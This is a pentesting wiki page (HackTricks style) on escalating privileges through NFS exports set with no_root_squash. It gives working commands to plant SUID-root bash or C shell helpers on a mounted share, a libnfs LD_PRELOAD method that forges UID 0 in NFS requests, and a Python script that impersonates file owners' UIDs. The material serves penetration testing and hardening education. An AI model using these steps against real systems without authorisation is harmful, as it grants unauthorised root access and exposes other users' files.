# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Squashing Basic Info

With NFS AUTH_SYS/AUTH_UNIX, the server bases file-permission checks on the `uid` and `gid` supplied in each RPC request. Other security flavors, such as Kerberos, use different credentials, and the server can map numeric credentials before checking permissions.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Maps every UID and GID to the anonymous account, which defaults to `nobody` (65534) on Linux. `no_all_squash` is the default for non-root requests.<sup>[[4]](#references)</sup>
- **`root_squash`**: This is the default on Linux and maps requests with UID/GID 0 (root) to the anonymous account; other UIDs and GIDs are not squashed.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Disables root squashing, so requests with UID/GID 0 can be evaluated as root on the server.<sup>[[4]](#references)</sup>

If an allowed client can mount a writable export in **`/etc/exports`** configured with **`no_root_squash`**, its UID/GID 0 requests can write there as the server's root user.<sup>[[4]](#references)</sup>

For more information about **NFS** check:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 using bash:
- On an allowed client, mount a writable export as root, copy **`/bin/bash`** into it, set its **SUID** bit, and execute it from a victim mount that does not use `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - For the uploaded file to remain owned by root, the server must use **`no_root_squash`**. If root is squashed, a SUID binary for another account is possible only when the client can legitimately create or own it with that account's numeric UID/GID.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 using compiled C code:
- Mount the directory from an allowed client, copy in a compiled payload that abuses SUID permissions, set its **SUID** bit, and execute it from the victim (see some [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Same restrictions as before

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
> The following trick is useful when `/etc/exports` restricts the export to the victim's IP: the remote client cannot mount it, but the local technique can operate through the share already mounted on the allowed host.<sup>[[2]](#references)</sup>\
> For this unprivileged libnfs method, the export in **`/etc/exports`** must use the `insecure` flag so the process can use a non-reserved source port; `secure` is the default, although a process able to bind a reserved port does not need this option.<sup>[[1]](#references)[[4]](#references)</sup>

### Basic Information

An NFSv3 AUTH_UNIX client includes its effective UID, GID, and groups in each call, and the server uses them for permission checks. This local technique abuses that model by forging the RPC credentials through [libnfs](https://github.com/sahlberg/libnfs); its preload module supports overriding the UID/GID in the NFS context.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compiling the Library

The libnfs example may require adjustments for the target kernel; the walkthrough used here specifically notes commenting out the fallocate syscalls before compiling the preload module.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Conducting the Exploit

The example creates a small C helper that launches a shell, then places it on the share and uses `ld_nfs.so` with UID 0 in the NFS context to make it SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compile the exploit code:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Place the exploit on the share and modify its permissions by faking the UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Execute the exploit to gain root privileges**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell for Stealthy File Access

Once root access is obtained, this `nfsh.py` pattern sets the effective UID to the target file's UID before running a command, allowing access without recursively changing ownership.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Run like:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [A tale of a lesser known NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux manual page](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Version 3 Protocol Specification](https://datatracker.ietf.org/doc/html/rfc1813)

{{#include ../../banners/hacktricks-training.md}}
